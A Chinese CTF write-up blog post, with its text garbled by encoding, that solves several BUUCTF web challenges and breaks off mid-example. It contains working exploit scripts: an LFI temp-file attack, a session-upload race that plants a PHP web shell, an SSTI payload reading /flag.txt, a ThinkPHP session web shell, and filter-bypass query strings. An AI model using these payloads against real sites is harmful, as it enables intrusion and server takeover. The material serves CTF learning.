title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281621117.png" alt="image-20220128162116498"></p><p>å‘ç°é¦–é¡µæç¤ºå’Œcookieçš„å†…å®¹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281621137.png" alt="image-20220128162156030"> </p><p>å°è¯•ä¼ å‚ name=1 å‘ç°å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–ï¼Œè¯´æ˜name=1å‚ä¸äº†åŠ ç›è¿ç®—</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281627111.png" alt="image-20220128162710007"></p><p>ç„¶åæˆ‘å¯¹1æ±‚MD5ï¼Œä¼ å…¥ä¹‹åè¿”å›ä¸€ä¸ªhash å…ˆè¯´æ˜çè¯•çš„ï¼ŒæŠŠè¿™æ¬¡æ‹¿åˆ°çš„hashé‡æ–°ä¼ å…¥ å³ 57632xxï¼Œå‘ç°è·³è½¬åˆ°404pageäº†ã€‚æ²¡å•¥çº¿ç´¢æŠ“åŒ…çœ‹çœ‹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281629190.png" alt="image-20220128162926083"></p><p> å‘ç°äº†è¿™ä¸ª <code>flflflflag.php</code> è®¿é—®è¿™ä¸ªé¡µé¢è¯•è¯•çœ‹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281630054.png" alt="image-20220128163045950"></p><p>æœ‰ä¸€ä¸ª include($_GET[â€œfileâ€]) å‚æ•°</p><p>ä½¿ç”¨ä¼ªåè®®è¯»å–ä¸€ä¸‹æºç  <code>file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;<br>&lt;/script&gt;<br>&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨PHP 7 Segment fault ç‰¹æ€§ã€‚å½“å‘é€å«æœ‰æ–‡ä»¶çš„æ•°æ®åŒ…æ—¶PHPå´©æºƒï¼Œè€Œä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤  <a href="https://bugs.php.net/bug.php?id=77231">https://bugs.php.net/bug.php?id=77231</a></p><p>æ„å»ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment">#payload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span><br>payload = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br>file_data=&#123;<br>   <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(payload.encode())<br>&#125;<br>url=<span class="hljs-string">&quot;http://62261363-872f-406d-a83f-042a1bf5c4a1.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="hljs-keyword">try</span>:<br>    r=requests.post(url=url,files=file_data,allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>è®¿é—®dir.phpè·å–è·¯å¾„</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281654091.png" alt="image-20220128165409006"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281657283.png" alt="image-20220128165703157"></p><p>ä¹Ÿå¯ä»¥ç”¨  session.upload_progress </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> sys<br>sessid = <span class="hljs-string">&#x27;D3n13d&#x27;</span><br>url=<span class="hljs-string">&#x27;http://62261363-872f-406d-a83f-042a1bf5c4a1.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        resp = session.post(url=url, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;cmd.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;<br>        , files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.txt&#x27;</span>,f)&#125;<br>        , cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment">#resp = session.post(url=url+sessid,data=data)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = threading.Thread(target=write, args=(session, ))<br>        t1.daemon = <span class="hljs-literal">True</span><br>        t1.start()<br>        read(session)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® cmd.php  postï¼šcmd=phpinfo();</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p>å­˜åœ¨ä¸€ä¸ª /secret æ–‡ä»¶  <code>url/secret?secret=1</code></p><p>ç„¶åå°è¯•ä¼ å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281848362.png" alt="image-20220128184811257"></p><p>å‘ç°æœ‰ RC4åŠ å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è„šæœ¬é“¾æ¥https://www.cnblogs.com/kevinbruce656/p/12638843.html</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):</span><br>    <span class="hljs-comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span><br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span><br>    <span class="hljs-comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span><br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span><br>    <span class="hljs-comment"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span><br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    <span class="hljs-comment"># print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)</span><br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))<br>    <span class="hljs-comment">#print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)</span><br>    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>rc4_main(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281852545.png" alt="image-20220128185235455"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>Tpçš„è¯å¯ä»¥å°è¯•è¾“é”™è·¯å¾„æ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281853020.png" alt="image-20220128185337938"></p><p>é‚£å°±æ‰¾ç›¸å…³çš„exp å¸ˆå‚…çš„åˆ†ææ–‡ç«  <a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a></p><p>å¤§è‡´å°±æ˜¯ session æ–‡ä»¶åå†…å®¹å¯æ§ï¼Œå¯ä»¥rce</p><p>ç„¶åæŠ“åŒ… æ”¹ session sessioné•¿åº¦ä¸º32ä½ æŠ›å»å°¾ç¼€å°±æ˜¯28 str_repeatå°±å¥½äº†</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281954989.png" alt="image-20220128195455863"></p><p>ç„¶åæœç´¢æ è¿™é‡Œæä¸ªä¸€å¥è¯</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281949264.png" alt="image-20220128194904133"></p><p>è®¿é—®     <code>/runtime/session/sess_1111111111111111111111111111.php</code> å‘ç°å†…å®¹æˆåŠŸè½½å…¥</p><p>ä¸Šèšå‰‘</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281958990.png" alt="image-20220128195824859"></p><p>ä½†æ˜¯å‘ç°æƒé™ä¸è¶³ï¼Œç»å…¸èšå‰‘ ç»•è¿‡disable_functionæ’ä»¶</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282002365.png" alt="image-20220128200208231"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>æ ¹æ®é¦–é¡µæç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Here is the real page =w= --&gt;</span><br><span class="hljs-comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282003179.png" alt="image-20220128200344062"></p><p>1nD3x.php ä¸€ä¸ªå¾ˆé»‘å®¢çš„é¡µé¢ è·Ÿè¿›ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>error_reporting(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    extract(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br>preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ƒå‘ƒå‘ƒ ä¸€çœ¼çŸ¥è¯†ç‚¹æ‚ç³…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>    ...<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <span class="hljs-variable">$REQUEST</span><br>    <span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) == <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br>preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) )<br></code></pre></td></tr></table></figure><p>å¯¹äº $_SERVER[â€˜QUERY_STRINGâ€™] PHPå¹¶ä¸ä¼šå¯¹å…¶åšè§£ç å¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥urlencode</p><p>ç„¶åæ˜¯ ç¬¬å››è¡Œçš„if %0aç»•è¿‡</p><p>ç¬¬äº”è¡Œçš„ $REQUEST  ç”±äºä¹‹å‰æ¥æ”¶çš„å‚æ•°ä¸º<code>$_GET</code>ï¼Œè€Œè¿™å„¿å¤„ç†çš„<code>$_REQUEST</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦POSTä¸€äº›ç›¸åŒçš„å‚æ•°ï¼Œè¿™æ˜¯å› ä¸º$REQUESTå¤„ç†æ•°æ®$_POSTä¼˜å…ˆçº§æ›´é«˜</p><p>ç¬¬å…­è¡Œ dataä¼ªåè®®</p><p>ç¬¬ä¸ƒè¡Œå“ˆå¸Œæ¯”è¾ƒ ç›´æ¥æ•°ç»„</p><p>æœ‰</p><p><code>file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;shana[]=1&amp;passwd[]=2</code> =&gt;</p><p><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code></p><p>æœ€åä¸€ä¸ªifåˆ¤æ–­  $code(â€˜â€™, $arg) å¯ä»¥è”æƒ³åˆ° create_function ä»£ç æ³¨å…¥</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-variable">$f</span>=create_function(<span class="hljs-string">&#x27;$a&#x27;</span>,<span class="hljs-variable">$b</span>);  <span class="hljs-comment">/* å‚æ•° &#x27;$a&#x27; $b å‡½æ•°ä½“</span><br><span class="hljs-comment">$f($a);</span><br><span class="hljs-comment">?&gt;</span><br><span class="hljs-comment">è¿™ä¸ªåŒ¿åå‡½æ•°ç›¸å½“äºè¿™æ 